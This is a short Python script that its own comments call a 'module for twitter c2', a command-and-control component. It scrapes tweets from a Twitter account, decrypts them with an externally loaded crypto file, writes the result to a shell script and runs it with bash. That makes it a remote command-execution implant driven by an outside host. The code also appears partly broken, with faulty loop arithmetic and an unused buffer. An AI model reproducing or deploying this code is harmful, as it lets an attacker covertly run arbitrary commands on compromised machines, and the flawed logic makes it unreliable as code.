# module for twitter c2
# kolache2 : a3829593@drdrb.net : flaky pastry
# initialization requires an iptables command to redirect traffic through our proxy
# tweet2.old needs to be created in the script's folder

import urllib, os
execfile("tweet2-crypto.py")

urlhandle = urllib.urlopen("http://twitter.com/kolache2")
urldata = urlhandle.read()

memhdl = open("tweet2.old", "r")
memstr = memhdl.read()
memhdl.close()
filehdl = open("tweet2.sh", "w")

mostrecent = True
tmpstr =""

c=0
while c < len(urldata):
	ccont = urldata.find("data-time", c)
	recentmem = urldata[urldata.find("\"",ccont)+1:urldata.find("\"", ccont+12)]
	if recentmem == memstr:
		break
	if mostrecent:
		memhdl = open("tweet2.old", "w")
		memhdl.write(recentmem)
		memhdl.close()
		mostrecent = False
	ccont = urldata.find("js-tweet-text", c)
	if ccont == -1:
		# nothing to do here
		print("No more tweets available")
		break
	prstr = urldata[ccont:urldata.find("</p>",ccont)]
	# need to add memory of tweets already parsed
	encstr = prstr[prstr.find(">")+1:]
	if "===" in encstr:
		tmpstr = tmpstr+encstr[:-3]
	else:
		decstr = decryption(encstr)
		filehdl.write(decstr)
		filehdl.write("\n")
		tmpstr = ""
	c = c + ccont + len(prstr)

filehdl.close()
os.system("bash tweet2.sh")
